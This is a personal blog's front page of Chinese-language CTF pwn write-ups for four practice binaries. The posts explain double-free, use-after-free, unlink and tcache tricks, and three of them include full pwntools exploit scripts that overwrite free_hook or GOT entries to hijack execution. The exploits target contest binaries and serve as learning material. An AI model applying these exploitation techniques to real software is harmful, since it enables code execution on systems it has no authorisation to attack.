


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<title> [ your blog title ]</title>
	
	
	<!-- stylesheets list from _config.yml -->
	
	<link rel="stylesheet" href="/css/PreciousJoy.css">
	
	<link rel="stylesheet" href="/css/top-bar.css">
	
	<link rel="stylesheet" href="/css/menu-outer.css">
	
	<link rel="stylesheet" href="/css/content-outer.css">
	
	<link rel="stylesheet" href="/css/bottom-outer.css">
	
	<link rel="stylesheet" href="/css/atom-one-dark.css">
	
	<link rel="stylesheet" href="/css/recent-posts-item.css">
	
	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
	
	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
	
	<link rel="stylesheet" href="/css/search.css">
	
	<link rel="stylesheet" href="/css/toc.css">
	
	<link rel="stylesheet" href="/css/sidebar.css">
	
	<link rel="stylesheet" href="/css/archive.css">
	
	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
	
	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
	
	
	
<meta name="generator" content="Hexo 6.3.0"></head>




<body id="wrapper">

	<div id="">
		
		<div id="top-bar">
			
			<div id="avatar-box">
				<img 
				class="avatar"
				src="/images/default-avatar.jpg" 
				alt="avatar">
			</div>

			<div id="top-bar-text">
				<div id="top-bar-title">
					pa1n
				</div>
				<div id="top-bar-slogan">
					
				</div>
			</div>

		</div>

		<div id="menu-outer">
			<div id="menu-inner">
				
				
				<div class="menu-item">
					<a href="/">Home</a>
				</div>
				
				<div class="menu-item">
					<a href="/about">About</a>
				</div>
				
				<div class="menu-item">
					<a href="/archives">Archives</a>
				</div>
				

				<div class="menu-item menu-item-search">
					
  <span class="local-search local-search-google local-search-plugin">
      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
      <div id="local-search-result" class="local-search-result-cls"></div>
  </span>
	
				</div>

			</div>
		</div>

		<div id="content-outer">
			<div id="content-inner">

				

<div id="recent-posts-box">

  
  <div id="recent-posts">
    <!-- <h1>Recent Posts</h1> -->
    
    
    <div class="recent-post-item">

      <a href="/2023/12/03/metasequoia-2020-samsara/" class="item-title">metasequoia_2020_samsara</a>
      
      <time datetime="2023-12-03T08:02:58.000Z">
        2023-12-03
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 保护全开，就不放了程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag
先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef

开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意expfrom pwn import*
from LibcSearcher import *
#p=remote(&quot;node4.buuoj.cn&quot;,28766)
p=process(&quot;./metasequoia_2020_samsara&quot;)
context.log_level=&quot;debug&quot;

libc=ELF(&#39;./libc-2.23.so&#39;)

def add():
    p -->
        <!-- </div> -->

        
        <h5 id="保护全开，就不放了"><a href="#保护全开，就不放了" class="headerlink" title="保护全开，就不放了"></a>保护全开，就不放了</h5><h5 id="程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag"><a href="#程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag" class="headerlink" title="程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag"></a>程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag</h5><p><img src="https://i.imgs.ovh/2023/12/03/wSene.png" alt=""></p>
<h5 id="先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef"><a href="#先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef" class="headerlink" title="先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef"></a>先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef</h5><p><img src="https://i.imgs.ovh/2023/12/03/wukUH.png" alt="image-20231203164238201"></p>
<p><img src="https://i.imgs.ovh/2023/12/03/wu1MT.png" alt="image-20231203165112607"></p>
<h5 id="开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意"><a href="#开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意" class="headerlink" title="开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意"></a>开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
from LibcSearcher import *
#p=remote(&quot;node4.buuoj.cn&quot;,28766)
p=process(&quot;./metasequoia_2020_samsara&quot;)
context.log_level=&quot;debug&quot;

libc=ELF(&#39;./libc-2.23.so&#39;)

def add():
    p.sendlineafter(&#39;choice &gt; &#39;,&#39;1&#39;)

def free(index):
    p.sendlineafter(&#39;choice &gt; &#39;,&#39;2&#39;)
    p.sendlineafter(&#39;Index&#39;,str(index))

def full(index,content):
    p.sendlineafter(&#39;choice &gt; &#39;,&#39;3&#39;)
    p.sendlineafter(&#39;Index&#39;,str(index))
    p.sendlineafter(&#39;Ingredient:&#39;,content)

def show():
    p.sendlineafter(&#39;choice &gt; &#39;,&#39;4&#39;)

def move(content):
    p.sendlineafter(&#39;choice &gt; &#39;,&#39;5&#39;)
    p.sendlineafter(&#39;Which kingdom?&#39;,content)

add() #0
add() #1
add() #2
free(0)
free(1)
free(0)
show()

p.recvuntil(&#39;Your lair is at: &#39;)
addr=int(p.recv(14),16)
#addr = int(p.recvuntil(&#39;\n&#39;, drop=True), 16)
print(&#39;addr=&gt;&#39;+hex(addr))
move(str(0x20))
gdb.attach(p)
pause()
#sleep(1)


v8=addr-0x8
add() #3
full(3,str(v8))
add() #4
add() #5

add() #6

full(6,str(0xdeadbeef))

p.sendlineafter(&#39;choice &gt; &#39;,&#39;6&#39;)

p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2023/12/03/metasequoia-2020-samsara/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2023/11/27/ciscn-2019-c-3/" class="item-title">ciscn_2019_c_3</a>
      
      <time datetime="2023-11-27T13:21:21.000Z">
        2023-11-27
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 
开启了全局偏移add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数
show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址
delete函数，存在很明显的UAF漏洞
还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针
先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆add(0x100,&#39;aaaa&#39;) #0
add(0x60,&#39;bbbb&#39;) #1
for i in range(8):
    delete(0)


然后show的话能接收到其地址show(0)

p.recvuntil(&quot;attack_times: &quot;)
#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
arena_96=int(p.recvuntil(&#39;\n&#39;,d -->
        <!-- </div> -->

        
        <p><img src="https://i.imgs.ovh/2023/11/27/pnlWA.png" alt="image-20231127212242738"></p>
<h5 id="开启了全局偏移"><a href="#开启了全局偏移" class="headerlink" title="开启了全局偏移"></a>开启了全局偏移</h5><h5 id="add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数"><a href="#add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数" class="headerlink" title="add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数"></a>add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnne5.png" alt="image-20231127212332956"></p>
<h5 id="show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址"><a href="#show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址" class="headerlink" title="show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址"></a>show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnhGT.png" alt="image-20231127213053713"></p>
<h5 id="delete函数，存在很明显的UAF漏洞"><a href="#delete函数，存在很明显的UAF漏洞" class="headerlink" title="delete函数，存在很明显的UAF漏洞"></a>delete函数，存在很明显的UAF漏洞</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnb8d.png" alt="image-20231127213159824"></p>
<h5 id="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"><a href="#还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针" class="headerlink" title="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"></a>还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnSAK.png" alt="image-20231127213350417"></p>
<h5 id="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆"><a href="#先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆" class="headerlink" title="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆"></a>先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆</h5><pre><code class="lang-py">add(0x100,&#39;aaaa&#39;) #0
add(0x60,&#39;bbbb&#39;) #1
for i in range(8):
    delete(0)
</code></pre>
<p><img src="https://i.imgs.ovh/2023/11/27/pnJD3.png" alt="image-20231127215520780"></p>
<h5 id="然后show的话能接收到其地址"><a href="#然后show的话能接收到其地址" class="headerlink" title="然后show的话能接收到其地址"></a>然后show的话能接收到其地址</h5><pre><code class="lang-py">show(0)

p.recvuntil(&quot;attack_times: &quot;)
#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))
</code></pre>
<pre><code class="lang-py">malloc_hook=arena_96-96-0x10
base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
free_hook=base+libc.sym[&#39;__free_hook&#39;]
gadget=base+one_gadget
</code></pre>
<h5 id="再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook"><a href="#再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook" class="headerlink" title="再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook"></a>再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook</h5><pre><code class="lang-py">payload=p64(0)*2+p64(free_hook-0x10)
add(0x60,payload) #2
</code></pre>
<p><img src="https://i.imgs.ovh/2023/11/27/pnGZ0.png" alt="image-20231127221735133"></p>
<h5 id="double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址"><a href="#double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址" class="headerlink" title="double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址"></a>double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnNKC.png" alt="image-20231127221921315"></p>
<p><img src="https://i.imgs.ovh/2023/11/27/pnajt.png" alt="image-20231127222235671"></p>
<pre><code class="lang-py">add(0x60,&#39;aaaa&#39;)
add(0x60,&#39;bbbb&#39;)
add(0x60,p64(gadget))
delete(1)
</code></pre>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
from LibcSearcher import *
#p=remote(&quot;node4.buuoj.cn&quot;,29798)
p=process(&quot;./ciscn_2019_c_3&quot;)
context.log_level=&quot;debug&quot;
libc=ELF(&#39;./libc-2.27.so&#39;)
context.arch=&#39;amd64&#39;

one_gadget=0x4f322
def add(size,content):
    p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;)
    p.sendlineafter(&#39;size: &#39;,str(size))
    p.sendlineafter(&#39;Give me the name: &#39;,content)

def show(index):
    p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;)
    p.sendlineafter(&#39;index: &#39;,str(index))

def delete(index):
    p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;)
    p.sendlineafter(&#39;weapon:&#39;,str(index))

def back(index):
    p.sendlineafter(&#39;Command: &#39;,&#39;666&#39;)
    p.sendlineafter(&#39;weapon:&#39;,str(index))



add(0x100,&#39;aaaa&#39;) #0
add(0x60,&#39;bbbb&#39;) #1

for i in range(8):
    delete(0)

show(0)

p.recvuntil(&quot;attack_times: &quot;)
#arena = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
arena_96=int(p.recvuntil(&#39;\n&#39;,drop=True))
malloc_hook=arena_96-96-0x10

base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
free_hook=base+libc.sym[&#39;__free_hook&#39;]
gadget=base+one_gadget


payload=p64(0)*2+p64(free_hook-0x10)#2
add(0x60,payload)

delete(2)
delete(2)


for i in range(0x20):
    back(2)
gdb.attach(p)
sleep(1)
add(0x60,&#39;aaaa&#39;)
add(0x60,&#39;bbbb&#39;)
print(hex(free_hook))

add(0x60,p64(gadget))

delete(1)
p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2023/11/27/ciscn-2019-c-3/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2023/11/02/ciscn-final-2/" class="item-title">ciscn_final_2</a>
      
      <time datetime="2023-11-02T14:07:31.000Z">
        2023-11-02
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 例行检查，保护全开，就不放了。add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放
存在double free漏洞
可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。
前戏是先double free改堆头的size，改size容易但是中间得add好几个堆add(1,&#39;11&#39;)
dele(1)
add(2,&#39;22&#39;)
add(2,&#39;11&#39;)
add(2,&#39;11&#39;)
add(2,&#39;22&#39;)
dele(2)
add(1,&#39;11&#39;)
dele(2)
show(2)
p.recvuntil(&#39;your short type inode number :&#39;)
addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0

add(2,addr)
add(2,&#39;11&#39; -->
        <!-- </div> -->

        
        <h5 id="例行检查，保护全开，就不放了。"><a href="#例行检查，保护全开，就不放了。" class="headerlink" title="例行检查，保护全开，就不放了。"></a>例行检查，保护全开，就不放了。</h5><h5 id="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"><a href="#add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放" class="headerlink" title="add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放"></a>add函数，只能申请0x20大小的堆或者0x10大小的，只能先申请再释放</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZX3dv.png" alt="image-20231102221044737"></p>
<h5 id="存在double-free漏洞"><a href="#存在double-free漏洞" class="headerlink" title="存在double free漏洞"></a>存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXmFe.png" alt="image-20231102221330585"></p>
<h5 id="可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。"><a href="#可以double-free泄露出堆地址，但是是int类型，接收的话用addr-int-p-recvuntil-‘-n’-drop-True-发送的时候用str类型就可在内存里用十六进制存储了。" class="headerlink" title="可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。"></a>可以double free泄露出堆地址，但是是int类型，接收的话用addr=int(p.recvuntil(‘\n’, drop=True)),发送的时候用str类型就可在内存里用十六进制存储了。</h5><p><img src="https://i0.imgs.ovh/2023/11/02/ZXwuW.png" alt="image-20231102221416344"></p>
<h5 id="前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆"><a href="#前戏是先double-free改堆头的size，改size容易但是中间得add好几个堆" class="headerlink" title="前戏是先double free改堆头的size，改size容易但是中间得add好几个堆"></a>前戏是先double free改堆头的size，改size容易但是中间得add好几个堆</h5><pre><code class="lang-py">add(1,&#39;11&#39;)
dele(1)
add(2,&#39;22&#39;)
add(2,&#39;11&#39;)
add(2,&#39;11&#39;)
add(2,&#39;22&#39;)
dele(2)
add(1,&#39;11&#39;)
dele(2)
show(2)
p.recvuntil(&#39;your short type inode number :&#39;)
addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0

add(2,addr)
add(2,&#39;11&#39;)
add(2,0x91) #改掉size
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/11/02/ZXhGo.png" alt="image-20231102222318910"></p>
<h5 id="free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96"><a href="#free7次使其进入unsortedbin-前面改size成0x90是最小的大小，不然下面的地址不会是main-arena-96" class="headerlink" title="free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96"></a>free7次使其进入unsortedbin,前面改size成0x90是最小的大小，不然下面的地址不会是main_arena+96</h5><pre><code class="lang-py">for i in range(7):
    dele(1)
    add(2,5)

dele(1)
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/11/02/ZXKu5.png" alt="image-20231102223102271"></p>
<h5 id="接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。"><a href="#接收并计算地址-至于为什么是-IO-2-1-stdin-0x70，应该是它执行时候的地址。" class="headerlink" title="接收并计算地址,至于为什么是 IO_2_1_stdin +0x70，应该是它执行时候的地址。"></a>接收并计算地址,至于为什么是 <em>IO_2_1_stdin </em>+0x70，应该是它执行时候的地址。</h5><pre><code class="lang-py">show(1)
p.recvuntil(&#39;your int type inode number :&#39;)
malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70
base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70
</code></pre>
<h5 id="再次malloc改掉堆地址-然后填充"><a href="#再次malloc改掉堆地址-然后填充" class="headerlink" title="再次malloc改掉堆地址,然后填充"></a>再次malloc改掉堆地址,然后填充</h5><pre><code class="lang-py">add(1,stdin)
add(1,0x30)
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/11/02/ZXSAX.png" alt="image-20231102223851495"></p>
<h5 id="再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"><a href="#再次double-free获取头地址，再次show出来的堆头地址和开始时的时不一样的。" class="headerlink" title="再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。"></a>再次double free获取头地址，再次show出来的堆头地址和开始时的时不一样的。</h5><pre><code class="lang-py">dele(1)
add(2,0x30)
dele(1) #double free

show(1)
p.recvuntil(&#39;your int type inode number :&#39;)
chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/11/02/ZXRWt.png" alt="image-20231102224535159"></p>
<h5 id="再改堆指针-填充"><a href="#再改堆指针-填充" class="headerlink" title="再改堆指针,填充"></a>再改堆指针,填充</h5><pre><code class="lang-py">add(1,chunk0)
add(1,chunk0)
add(1,111)
add(1,666)
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/11/02/ZXcgm.png" alt="image-20231102224934035"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *
from LibcSearcher import *
p=process(&#39;./ciscn_final_2&#39;)
#p=remote(&#39;node4.buuoj.cn&#39;,26681)
context( os = &#39;linux&#39;,arch=&#39;amd64&#39;)
context.log_level = &#39;debug&#39;
elf=ELF(&#39;./ciscn_final_2&#39;)
libc=ELF(&#39;./libc-2.27.so&#39;)
def add(index,content):
    p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)
    p.sendlineafter(&#39;&gt;&#39;,str(index))
    p.sendlineafter(&#39;your inode number:&#39;,str(content))

def dele(index):
    p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)
    p.sendlineafter(&#39;&gt;&#39;,str(index))

def show(index):
    p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)
    p.sendlineafter(&#39;&gt;&#39;,str(index))

add(1,&#39;11&#39;)
dele(1)
add(2,&#39;22&#39;)
add(2,&#39;11&#39;)
add(2,&#39;11&#39;)
add(2,&#39;22&#39;)
dele(2)
add(1,&#39;11&#39;)
dele(2)
show(2)
p.recvuntil(&#39;your short type inode number :&#39;)
addr=int(p.recvuntil(&#39;\n&#39;, drop=True))-0xa0

add(2,addr)
add(2,&#39;11&#39;)
add(2,0x91)

for i in range(7):
    dele(1)
    add(2,5)

dele(1)

show(1)
p.recvuntil(&#39;your int type inode number :&#39;)
malloc_hook=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x70
base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70

add(1,stdin)  ###???
add(1,0x30)

#double free

dele(1)
add(2,0x30)
dele(1)


show(1)
p.recvuntil(&#39;your int type inode number :&#39;)
chunk0=int(p.recvuntil(&#39;\n&#39;, drop=True))-0x30
add(1,chunk0)
gdb.attach(p)
sleep(1)
add(1,chunk0)
add(1,111)
add(1,666)

p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)
p.recvuntil(&#39;your message :&#39;)

#print(addr)
p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2023/11/02/ciscn-final-2/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2023/10/30/sleepyHolder-hitcon-2016/" class="item-title">sleepyHolder_hitcon_2016</a>
      
      <time datetime="2023-10-30T12:09:08.000Z">
        2023-10-30
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 例行检查
add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次
dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆
这还有个edit函数
add(1,&#39;AAAA&#39;) #堆0
add(2,&#39;BBBB&#39;) #堆1

dele(1)
add(3,&#39;cccc&#39;) #堆2

因为堆2太大所以free chunk会放在smallbin里
这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink
再申请一次堆add(1,&#39;aaaa&#39;)


后面构造fake_chunk,然后dele(2),会unlinkpayload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
edit(1,payload)
dele(2) #unlink


注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有 -->
        <!-- </div> -->

        
        <h5 id="例行检查"><a href="#例行检查" class="headerlink" title="例行检查"></a>例行检查</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AS5sW.png" alt=""></p>
<h5 id="add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次"><a href="#add函数，能分别申请一个0x28，0xfa0-0x61a80大小的堆一次" class="headerlink" title="add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次"></a>add函数，能分别申请一个0x28，0xfa0,0x61a80大小的堆一次</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASi8V.png" alt="image-20231031212602644"></p>
<h5 id="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"><a href="#dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆" class="headerlink" title="dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆"></a>dele函数，存在UAF漏洞，指针没有清零，但是对应的数清零了，所以可以再次申请堆</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AfdAt.png" alt="image-20231030201715281"></p>
<h5 id="这还有个edit函数"><a href="#这还有个edit函数" class="headerlink" title="这还有个edit函数"></a>这还有个edit函数</h5><p><img src="https://i0.imgs.ovh/2023/10/31/ASteK.png" alt="image-20231030204040558"></p>
<pre><code class="lang-py">add(1,&#39;AAAA&#39;) #堆0
add(2,&#39;BBBB&#39;) #堆1

dele(1)
add(3,&#39;cccc&#39;) #堆2
</code></pre>
<h5 id="因为堆2太大所以free-chunk会放在smallbin里"><a href="#因为堆2太大所以free-chunk会放在smallbin里" class="headerlink" title="因为堆2太大所以free chunk会放在smallbin里"></a>因为堆2太大所以free chunk会放在smallbin里</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Ah5hd.png" alt="image-20231031172733305"></p>
<h5 id="这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"><a href="#这里有个漏洞，double-free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink" class="headerlink" title="这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink"></a>这里有个漏洞，double free堆0后再次申请堆0，堆1的size位还是0，所以可以利用unlink</h5><p><img src="https://i0.imgs.ovh/2023/10/31/Asbk2.png" alt="image-20231031173201803"></p>
<h5 id="再申请一次堆"><a href="#再申请一次堆" class="headerlink" title="再申请一次堆"></a>再申请一次堆</h5><pre><code class="lang-py">add(1,&#39;aaaa&#39;)
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/31/ASOFp.png" alt="image-20231030220449382"></p>
<h5 id="后面构造fake-chunk-然后dele-2-会unlink"><a href="#后面构造fake-chunk-然后dele-2-会unlink" class="headerlink" title="后面构造fake_chunk,然后dele(2),会unlink"></a>后面构造fake_chunk,然后dele(2),会unlink</h5><pre><code class="lang-py">payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
edit(1,payload)
dele(2) #unlink
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/31/As5D5.png" alt="image-20231031173510102"></p>
<h5 id="注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1"><a href="#注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1" class="headerlink" title="注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1"></a>注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1</h5><pre><code class="lang-py">payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)
edit(1,payload)  #8
</code></pre>
<p><img src="https://i0.imgs.ovh/2023/10/31/Axq5v.png" alt="image-20231031175111527"></p>
<pre><code>edit(2,p64(0x400760))  #put_plt
edit(1,p64(0x602020))  #puts_got
</code></pre><h5 id="把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址"><a href="#把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址" class="headerlink" title="把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址"></a>把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AxaJ9.png" alt="image-20231031175406206"></p>
